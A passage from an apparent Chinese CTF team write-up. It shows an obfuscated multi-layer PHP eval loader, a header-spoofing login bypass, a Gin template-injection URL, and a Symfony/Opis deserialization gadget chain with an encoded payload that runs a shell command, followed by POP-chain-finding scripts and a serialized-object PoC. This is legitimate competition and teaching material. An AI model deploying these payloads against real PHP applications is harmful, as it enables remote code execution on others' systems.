define('IKlSux1227',__FILE__);$DusPFr=base64_decode(\u0026quot;bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqZHF0d3lpT2VBY1VaTHBDdUhuYm1ndkZzZlNhUFlsTUpCTmpSVmtLeFFEVFdJcnpFb1hHaA==\u0026quot;);$arCiCL=$DusPFr[3].$DusPFr[6].$DusPFr[33].$DusPFr[30];$VvUrBZ=$DusPFr[33].$DusPFr[10].$DusPFr[24].$DusPFr[10].$DusPFr[24];$DEomKk=$VvUrBZ[0].$DusPFr[18].$DusPFr[3].$VvUrBZ[0].$VvUrBZ[1].$DusPFr[24];$LnpnvY=$DusPFr[7].$DusPFr[13];$arCiCL.=$DusPFr[22].$DusPFr[36].$DusPFr[29].$DusPFr[26].$DusPFr[30].$DusPFr[32].$DusPFr[35].$DusPFr[26].$DusPFr[30];eval($arCiCL(\u0026quot;JFZDQlpRVz0iZ29NVFFoZXFpYVVPdWJtWWZSSlNya1dObmRFc1BaR2pBS3BDVnRCSUh3REZ4Y3pYTGx2eVlUY2lVdVBuZ3BzeXFib09saGpGSVpOU3d6bU1IR3ZEeHRrWFZhV2ZkQUpFclJLTENCUWVISjlBcGR4WUd2Vm9wTjVCdFh6WmhCdXVwWmZyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aR21qbmkwOWpITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJPMXo0ekV6cWlEVkdjMUdVVnYxQXMxU3ZVWjVzRkVrVFZaVk1iVkVMR0VqRGJCZktWMHVBek5tQXpkekZoVmtrc05ycGIxek9wRWhwVktCdlZEV1podkVMc0JHaUdLMDlmZ1o3am1rM2JadTFWSzBaR21qbmkwOWpOS1N6Q2doWlVva0hpMEJiU0IwcWp2aFhwWjlIRlZNS2MxMHFqdmhYcFo5SEZWTUtjRTA3amRHaGl2emRGSzBaR21qbmkwOWpOS2NLTEY0Wkdtam5pMDlqTkttQUxGNFpHbWpuaTA5ak5LZjBMRjRaR21qbmkwOWpOS21BTEY0Wkdtam5pMDlqTktmMExpTVpOTkdNendHc0hGaDJzc3J3aDBhYmNFMHFqdmhYcFo5SEZWTXJ5RTBxanZoWHBaOUhGVk1LTEY0WnpCRWNHMHpDTktXekNnaDJzc3J3aDBhYmNWMHFqdmhYcFo5SEZWTWVTRTA3anYxRVVWRXZPSzBaR21qbmkwOWpOS3p6Q2doWlVva0hpMEJiY2lTenllaHR6MjVmelZScUhGaFpVb2tIaTBCYmNEanpDZ2haVW9rSGkwQmJjS0d6Q2doWlVva0hpMEJiY0RCekNnaFpVb2tIaTBCYmNER3pDZ2haVW9rSGkwQmJjS1d6Q2doWlVva0hpMEJiY0tqekNnaFpVb2tIaTBCYmNLVnpDZ2haVW9rSGkwQmJjREd6Q2doWlVva0hpMEJiY0tXenkyVjJPTkFUam1rM2JadTFWZVlnRlpWcGlWVHJSZGtOcERXa1ZFVjBSQlRlU0xoc2hOck1zTnJwcEJqT05vQlpoTmhFR05hVE9WR05HbWpaVjFUS1YwenZTVmphUEVWREZtNTVOWnpBaHZmZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=\u0026quot;));?\u0026gt; 硬解 eval变echo的 差不多解个6层\n最后可以getflag\n\r\nflag:\ncazy{PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy} ","date":"2022-01-13T13:23:41+08:00","image":"https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/cover_hu2ef483a7301ed58558e75f3e1747bee2_206467_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/cazy-writeup-by-or4nge/","title":"长安战“疫” Writeup"},{"content":"Web loginme 第一步绕过本地验证，x-forwarded-for 和 client-ip 被过滤了，X-Real-IP:127.0.0.1 绕过\n第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 {{.Password}} 就可以获得 admin 结构体中的 Password 变量值了。\nhttp://124.71.166.197:18001/admin/index?id=5\u0026amp;age={{.Password}}\nUpload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 upload_path|$serialize 写进 /tmp/sess_or4nge，然后改自己的 session_id 为 or4nge，即可触发反序列化。\n利用给的 Composer.json：\n\u0026#34;symfony/string\u0026#34;: \u0026#34;^5.3\u0026#34;, \u0026#34;opis/closure\u0026#34;: \u0026#34;^3.6\u0026#34; 结合出题人发布的文章 https://www.anquanke.com/post/id/217929#h2-3 找到一条链，其中 lazystring 的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。\n\u0026lt;?php namespace Symfony\\Component\\String{ require \u0026#34;path\\to\\autoload.php\u0026#34;; class LazyString{ private $value; public function __construct() { $func = function(){system(\u0026#34;cat /flag\u0026#34;);}; $d = new \\Opis\\Closure\\SerializableClosure($func); $this-\u0026gt;value = $d; } } class UnicodeString{ protected $string = \u0026#39;\u0026#39;; public function __construct() { $this-\u0026gt;string=new LazyString; } } } namespace { $exp=print(urlencode(serialize(new Symfony\\Component\\String\\UnicodeString()))); } 其实这条链本地没有打通，原因是因为在 UnicodeString.php 里，对 $this-\u0026gt;string 进行了限制\npublic function __wakeup() { if (!\\is_string($this-\u0026gt;string)) { throw new \\BadMethodCallException(\u0026#39;Cannot unserialize \u0026#39;.__CLASS__); } normalizer_is_normalized($this-\u0026gt;string) ?: $this-\u0026gt;string = normalizer_normalize($this-\u0026gt;string); } 但是猜到出题人以前发布过，直接盲打过去，RCE 成功。\nupload_path|O%3A38%3A%22Symfony%5CComponent%5CString%5CUnicodeString%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00string%22%3BO%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3A1%3A%7Bs%3A42%3A%22%00Symfony%5CComponent%5CString%5CLazyString%00value%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A32%3A%22function%28%29%7Bsystem%28%22cat+%2Fflag%22%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A35%3A%22Symfony%5CComponent%5CString%5CLazyString%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%2200000000034bf950000000005225a861%22%3B%7D%7D%7D%7D FUMO_on_the_Christmas_tree 强网杯 pop_master 魔改的题\n首先是对 __invoke 和 __call 的魔术方法的类进行改写，全部能改写为正常的形式：\nimport re from base64 import b64decode def erase_call(FILEIN, FILEOUT): fp = open(FILEIN, \u0026#39;rb\u0026#39;) fo = open(FILEOUT, \u0026#39;wb\u0026#39;) FILE = [_.decode().replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) for _ in fp.readlines()] i = 0 while i \u0026lt; len(FILE): line = FILE[i] if \u0026#39;__call\u0026#39; in line: l1, l2 = FILE[i + 1], FILE[i + 2] use_func = re.search(r\u0026#39;extract\\(\\[\\$name =\u0026gt; \\\u0026#39;(.*)\\\u0026#39;\\]\\);\u0026#39;, l1)[1] pattern = re.search(r\u0026#39;if \\(is\\_callable\\(\\[\\$this\\-\\\u0026gt;(.*)\\, \\$(.*)\\]\\)\\)\u0026#39;, l2) obj_name, func_name = pattern[1], pattern[2] new_code = [] new_code.append(\u0026#39; public function %s($value) {\\n\u0026#39; % func_name) new_code.append(\u0026#39; if (is_callable([$this-\u0026gt;%s, %s])) @$this-\u0026gt;%s-\u0026gt;%s($value);\\n\u0026#39; % (obj_name, use_func, obj_name, use_func)) new_code.append(\u0026#39; }\\n\u0026#39;) for j in new_code: fo.write(j.encode()) i += 4 else: fo.write((line + \u0026#39;\\n\u0026#39;).encode()) i += 1 fp.close() fo.close() def erase_invoke(FILEIN, FILEOUT): fp = open(FILEIN, \u0026#39;rb\u0026#39;) fo = open(FILEOUT, \u0026#39;wb\u0026#39;) FILE = [_.decode().replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) for _ in fp.readlines()] i = 0 while i \u0026lt; len(FILE): line = FILE[i] if \u0026#39;@call_user_func\u0026#39; in line: pattern = re.search(r\u0026#39;call_user_func\\(\\$this\\-\\\u0026gt;(.*)\\, \\[\\\u0026#39;(.*)\\\u0026#39;\\=\\\u0026gt; \\$(.*)\\]\\);\u0026#39;, line) # print(pattern) obj_name, use_func, func_para = pattern[1], pattern[2], pattern[3] # print(obj_name, use_func, func_para) new_code = \u0026#34; if (is_callable([$this-\u0026gt;%s, \u0026#39;%s\u0026#39;])) @$this-\u0026gt;%s-\u0026gt;%s(%s);\\n\u0026#34; % (obj_name, use_func, obj_name, use_func, func_para) fo.write(new_code.encode()) elif \u0026#34;__invoke\u0026#34; in line: l1, l2 = FILE[i + 1], FILE[i + 2] key = re.search(r\u0026#39;\\$key = base64_decode\\(\\\u0026#39;(.*)\\\u0026#39;\\);\u0026#39;, l1)[1] key = b64decode(key.encode()).decode() pattern = re.search(r\u0026#39;\\$this\\-\\\u0026gt;(.*)\\-\\\u0026gt;(.*)\\(\\$value\\[\\$key\\]\\);\u0026#39;, l2) try: obj_name, use_func = pattern[1], pattern[2] except: print(line) print(l1) print(l2) new_code = [] new_code.append(\u0026#39; public function %s($value) {\\n\u0026#39; % key) new_code.append(\u0026#39; if (is_callable([$this-\u0026gt;%s, %s])) @$this-\u0026gt;%s-\u0026gt;%s($value);\\n\u0026#39; % (obj_name, use_func, obj_name, use_func)) new_code.append(\u0026#39; }\\n\u0026#39;) for j in new_code: fo.write(j.encode()) i += 3 else: fo.write((line + \u0026#39;\\n\u0026#39;).encode()) i += 1 fp.close() fo.close() erase_invoke(\u0026#39;class.code.txt\u0026#39;, \u0026#39;mid_class.txt\u0026#39;) erase_call(\u0026#39;mid_class.txt\u0026#39;, \u0026#39;final_class.txt\u0026#39;) 在最终代码里手动把 namespace christmasTree 里去掉，之后进行 PHP_Paser 对这份代码进行语法树构建分析：\n\u0026lt;?php ini_set(\u0026#39;memory_limit\u0026#39;, \u0026#39;1024M\u0026#39;); require \u0026#39;path\\to\\autoload.php\u0026#39;; error_reporting(0); use PhpParser\\Error; //use to catch error use PhpParser\\NodeDumper; //use to read node use PhpParser\\ParserFactory; //use to anlaysis code use PhpParser\\PrettyPrinter; $inputPhpFile = \u0026#39;final_class.txt\u0026#39;; $code = file_get_contents($inputPhpFile); $parser = (new ParserFactory)-\u0026gt;create(ParserFactory::PREFER_PHP7); try { $stmts = $parser-\u0026gt;parse($code); } catch (Error $e) { echo \u0026#34;Parse error:{$e-\u0026gt;getMessage()}\\n\u0026#34;; exit(0); } echo \u0026#34;[+] get file done\\n\u0026#34;; $deleteCnt = 0; $deleteCla = 0; $nodeDumper = new NodeDumper; $class_num = 0; $func_list = array(); $fp = fopen(\u0026#34;function_list.txt\u0026#34;, \u0026#34;wb\u0026#34;); $fo = fopen(\u0026#34;deploy_list.txt\u0026#34;, \u0026#34;wb\u0026#34;); $fd = fopen(\u0026#34;destination.txt\u0026#34;, \u0026#34;wb\u0026#34;); foreach ($stmts as $k =\u0026gt; $class_point) { if ($class_point-\u0026gt;gettype() === \u0026#39;Stmt_Nop\u0026#39;) continue; if ($class_point-\u0026gt;gettype() === \u0026#39;Stmt_Class\u0026#39;){ $class_name = $class_point-\u0026gt;name-\u0026gt;name; $class_num++; foreach ($class_point-\u0026gt;stmts as $kk =\u0026gt; $subpoint) { if ($subpoint-\u0026gt;gettype() === \u0026#39;Stmt_Nop\u0026#39;) continue; if ($subpoint-\u0026gt;gettype() === \u0026#39;Stmt_Property\u0026#39;) { ; } if ($subpoint-\u0026gt;gettype() === \u0026#34;Stmt_ClassMethod\u0026#34;) { $func_name = $subpoint-\u0026gt;name-\u0026gt;name; if ($func_name === \u0026#39;__destruct\u0026#39;) { $entrance = $class_name; break; } if (!$subpoint-\u0026gt;params) { continue; } $parms = $subpoint-\u0026gt;params[0]-\u0026gt;var-\u0026gt;name; fwrite($fp, $class_name.\u0026#39; \u0026#39;.$func_name.\u0026#34;\\n\u0026#34;); $pass_way = \u0026#34;pass\u0026#34;; foreach ($subpoint-\u0026gt;stmts as $kkk =\u0026gt; $method_point) { if ($method_point-\u0026gt;gettype() === \u0026#39;Stmt_Expression\u0026#39;) { $assign_1 = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;var-\u0026gt;name; $use_func = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;expr-\u0026gt;name-\u0026gt;parts[0]; $assign_2 = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;expr-\u0026gt;args[0]-\u0026gt;value-\u0026gt;name; if($use_func === null) { $assign_2 = $method_point-\u0026gt;expr-\u0026gt;expr-\u0026gt;expr-\u0026gt;name; $use_func = \u0026#34;pass\u0026#34;; } else { $func_list[$use_func] = 1; } if($assign_1 !== $assign_2) break; $pass_way = $use_func; if(in_array($pass_way, array(\u0026#34;sha1\u0026#34;, \u0026#34;md5\u0026#34;, \u0026#34;crypt\u0026#34;))) { break; } } else if($method_point-\u0026gt;gettype() === \u0026#39;Stmt_If\u0026#39;) { if ($method_point-\u0026gt;stmts[0]-\u0026gt;expr-\u0026gt;name-\u0026gt;parts[0] == \u0026#34;readfile\u0026#34;) { fwrite($fd, $class_name.\u0026#39; \u0026#39;.$func_name.\u0026#39; \u0026#39;.$parms.\u0026#34;\\n\u0026#34;); break; } $use_obj = $method_point-\u0026gt;stmts[0]-\u0026gt;expr-\u0026gt;expr-\u0026gt;var-\u0026gt;name-\u0026gt;name; $use_func = $method_point-\u0026gt;stmts[0]-\u0026gt;expr-\u0026gt;expr-\u0026gt;name-\u0026gt;name; fwrite($fo, $class_name.\u0026#39; \u0026#39;.$func_name.\u0026#39; \u0026#39;.$use_obj.\u0026#34; \u0026#34;.$use_func.\u0026#34; \u0026#34;.$pass_way.\u0026#34;\\n\u0026#34;); } } } } } } echo \u0026#39;[+] filter done\u0026#39; . \u0026#34;\\n\u0026#34;; echo $entrance; fclose($fp); fclose($fo); 构建把所有类的名称，函数，终点的类的函数，以及函数调用关系分别存储起来。 其中有一些污点过滤，比如 md5, sha1, ucfirst, crypt 的调用直接无视，赋值两边参数不等的也直接无视，另外发现 base64 解码的时候出现的不可见字符也会对后面产生影响，故把所有进行 base64_decode 部分全部剪掉。\n然后手动加一下 __destruct 在文件里，把这三个文件放在一起，然后用C语言寻找可行链。\n#include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; #define mem(a,b) memset(a,b,sizeof(a)) typedef long long LL; typedef pair\u0026lt;string, string\u0026gt; PII; #define X first #define Y second inline int read() { int x = 0, f = 1; char c = getchar(); while(!isdigit(c)){if(c == \u0026#39;-\u0026#39;)f = -1;c = getchar();} while(isdigit(c)){x = x * 10+ c-\u0026#39;0\u0026#39;; c = getchar();} return x * f; } const int maxn = 20010; struct Edge { int u, v, next; PII w; Edge(){} Edge(int _1, int _2, int _3, string _4, string _5): u(_1), v(_2), next(_3) { w = make_pair(_4,_5); } }e[maxn\u0026lt;\u0026lt;4]; int first[maxn], ce = -1, tot, tag[maxn]; string name[maxn], func[maxn], use[maxn]; struct Class { string name, func; Class() {} Class(string _1, string _2):name(_1), func(_2) {}\tbool operator \u0026lt; (const Class \u0026amp;s)const{ if(name == s.name){ return func \u0026lt; s.func; } return name \u0026lt; s.name; } }a[maxn]; int pre[maxn], n; PII prew[maxn]; void addEdge(int a,int b, string c,string d) { e[++ce] = Edge(a, b, first[a], c, d); first[a] = ce; }\tmap\u0026lt;Class, int\u0026gt; M; int match(Class A,string use_func, string use_obj, string pass) { for (int i = 1; i \u0026lt;= n; i++) { if (M[A] == i) continue; if (use_func == a[i].func) { addEdge(M[A], M[a[i]], use_obj, pass); } } } bool vis[maxn]; int count_chain; void dfs(int now, int fa) { vis[now] = 1; if (tag[now]) { count_chain ++; int tmp = now; cout \u0026lt;\u0026lt; a[tmp].name \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; a[tmp].func \u0026lt;\u0026lt; endl; string use_obj = prew[tmp].X, pass_way = prew[tmp].Y; tmp = pre[tmp]; while(tmp != -1) { cout \u0026lt;\u0026lt; a[tmp].name \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; a[tmp].func \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; use_obj \u0026lt;\u0026lt; \u0026#39; \u0026#39; \u0026lt;\u0026lt; pass_way \u0026lt;\u0026lt; endl; use_obj = prew[tmp].X, pass_way = prew[tmp].Y; tmp = pre[tmp]; } cout \u0026lt;\u0026lt; endl; return; } for (int i = first[now]; i != -1; i = e[i].next) { if(e[i].v != fa \u0026amp;\u0026amp; !vis[e[i].v]) { if(e[i].w.Y == \u0026#34;base64_encode\u0026#34;)continue; if(e[i].w.Y == \u0026#34;ucfirst\u0026#34;)continue; pre[e[i].v] = now; prew[e[i].v] = e[i].w; dfs(e[i].v, now); } } } int main() { mem(first, -1); freopen(\u0026#34;data.txt\u0026#34;, \u0026#34;rb\u0026#34;, stdin); freopen(\u0026#34;ans.txt\u0026#34;, \u0026#34;w\u0026#34;, stdout); int start = 1; n = read(); string params; for (int i = 1; i \u0026lt;= n; i++) { cin \u0026gt;\u0026gt; name[i] \u0026gt;\u0026gt; func[i]; a[i] = Class(name[i], func[i]); M[a[i]] = i; } int m = read(); for(int i=1;i\u0026lt;=m;i++){ string class_name, func_name, use_obj, use_func, pass_way; cin \u0026gt;\u0026gt; class_name \u0026gt;\u0026gt; func_name \u0026gt;\u0026gt; use_obj \u0026gt;\u0026gt; use_func \u0026gt;\u0026gt; pass_way;//$class_name.\u0026#39; \u0026#39;.$func_name.\u0026#39; \u0026#39;.$use_obj.\u0026#34; \u0026#34;.$use_func.\u0026#34; \u0026#34;.$pass_way \tint id = 1; for (int j = 1; j \u0026lt;= n; j++) if (class_name == name[j] \u0026amp;\u0026amp; func_name == func[j]) { id = j; break; } match(a[id], use_func, use_obj, pass_way); } int o = read(); for (int i = 1; i \u0026lt;= o; i++) { string x, y, z; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y \u0026gt;\u0026gt; z; int id = 0; for (int j = 1; j \u0026lt;= n; j++) if(x == name[j] \u0026amp;\u0026amp; y == func[j]) { id=j; break; } if(id==0)cout\u0026lt;\u0026lt;x\u0026lt;\u0026lt;\u0026#39; \u0026#39;\u0026lt;\u0026lt;y\u0026lt;\u0026lt;endl; tag[id] = 1; } pre[start] = -1; dfs(start, -1); cout\u0026lt;\u0026lt;count_chain; return 0; } 刚好只有一条可行链，倒序打印链：\nAN9pNsmlT Fhh5TZoD0 Ugh4SYk00D bLqi60vf tQF7ER str_rot13 xEFW8yw08 gvgCPyi nYuAuh2 str_rot13 Xl5V1fEbzD Z5G5uz fgVgm4TV97 pass d9vgRnlEA trZx9DLGq T4rUU9R base64_decode Ronyv7u Uaxr3XOrz uDQ0ehd4p strrev T6Y5QYS GP5h5gz p9mwE7l str_rot13 SKVnfvfbas gkbXYD UOvWbl pass o5d0ioNZ vBmg2S exGoDOPm str_rot13 FK0LfIlrxm uxVcfoc gZ9IzdbF6T pass eHSt3I5L30 YbMfp8D9 exoEH1 pass c76So3oF EttYcl6 cwQWOIEL strrev u1q3m04qZb EtQ6pQB NGIlAGGLv pass xT506K QiVLzL Dblxvn pass p6NArTi YgmXN30 VbpsE7wqUH base64_decode ezlgUUHCdQ lwUpo3 fDViVU pass uGnuU5pGgQ cc60Kte4Em XbW5o6yiGv base64_decode GGcIkQ6E a2l0Eeqr CK5OgoyC strrev vS1qenzGWr kR5Y66g yrVWMn9 pass amg2Vw __destruct PCR49GlRM pass 根据上述链的写脚本构造 poc：\nfp = open(\u0026#39;popchain.txt\u0026#39;, \u0026#39;r\u0026#39;) fo = open(\u0026#39;poc.php\u0026#39;, \u0026#39;w\u0026#39;) fo.write(\u0026#39;\u0026lt;?php\\nnamespace christmasTree{\\n\u0026#39;) line_list = [] for line in fp.readlines(): line = line.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) line_list.append(line) line_list = line_list[::-1] for i, line in enumerate(line_list[:-1]): class_name, func_name, use_obj, _ = line.split(\u0026#39; \u0026#39;) if i == 0: start_point = class_name next_name = line_list[i + 1].split(\u0026#39; \u0026#39;)[0] print(class_name, func_name, use_obj, next_name) payload = \u0026#39;\u0026#39;\u0026#39;class %s{ public $%s; public function __construct(){ $this-\u0026gt;%s= new %s(); } } \u0026#39;\u0026#39;\u0026#39; % (class_name, use_obj, use_obj, next_name) fo.write(payload + \u0026#39;\\n\u0026#39;) class_name, func_name = line_list[-1].split(\u0026#39; \u0026#39;) payload = \u0026#39;\u0026#39;\u0026#39;class %s{ public $%s; } \u0026#39;\u0026#39;\u0026#39; % (class_name, use_obj) fo.write(payload + \u0026#39;\\necho urlencode(serialize(new %s()));}\u0026#39; % start_point) print(class_name, func_name) 生成的 poc 不能直接打通，因为要求类内所有 public 属性都要进行赋值，对生成的 poc 还需要手动修改，对未利用的对象赋为 stdClass() 最终的poc：\n\u0026lt;?php namespace christmasTree{ class amg2Vw{ public $PCR49GlRM; public function __construct(){ $this-\u0026gt;PCR49GlRM = new vS1qenzGWr(); } } class vS1qenzGWr{ public $yrVWMn9; public $S839pvNRU; public function __construct(){ $this-\u0026gt;yrVWMn9 = new GGcIkQ6E(); $this-\u0026gt;S839pvNRU = new \\stdClass(); } } class GGcIkQ6E{ public $CK5OgoyC; public $Vkyud3; public function __construct(){ $this-\u0026gt;CK5OgoyC = new uGnuU5pGgQ(); $this-\u0026gt;Vkyud3 = new \\stdClass(); } } class uGnuU5pGgQ{ public $XbW5o6yiGv; public $XEH9BQ; public function __construct(){ $this-\u0026gt;XbW5o6yiGv = new ezlgUUHCdQ(); $this-\u0026gt;XEH9BQ = new \\stdClass(); } } class ezlgUUHCdQ{ public $fDViVU; public function __construct(){ $this-\u0026gt;fDViVU = new p6NArTi(); } } class p6NArTi{ public $VbpsE7wqUH; public $yKwNrpRAQ; public function __construct(){ $this-\u0026gt;VbpsE7wqUH = new xT506K(); $this-\u0026gt;yKwNrpRAQ = new \\stdClass(); } } class xT506K{ public $Dblxvn; public $sPEbogX4; public function __construct(){ $this-\u0026gt;Dblxvn = new u1q3m04qZb(); $this-\u0026gt;sPEbogX4 = new \\stdClass(); } } class u1q3m04qZb{ public $NGIlAGGLv; public function __construct(){ $this-\u0026gt;NGIlAGGLv = new c76So3oF(); } } class c76So3oF{ public $cwQWOIEL; public $rHYG3Wr; public function __construct(){ $this-\u0026gt;cwQWOIEL = new eHSt3I5L30(); $this-\u0026gt;rHYG3Wr = new \\stdClass(); } } class eHSt3I5L30{ public $exoEH1; public $UO4yLd; public function __construct(){ $this-\u0026gt;exoEH1 = new FK0LfIlrxm(); $this-\u0026gt;UO4yLd = new \\stdClass(); } } class FK0LfIlrxm{ public $gZ9IzdbF6T; public $Q7mg44bg; public function __construct(){ $this-\u0026gt;gZ9IzdbF6T = new o5d0ioNZ(); $this-\u0026gt;Q7mg44bg = new \\stdClass(); } } class o5d0ioNZ{ public 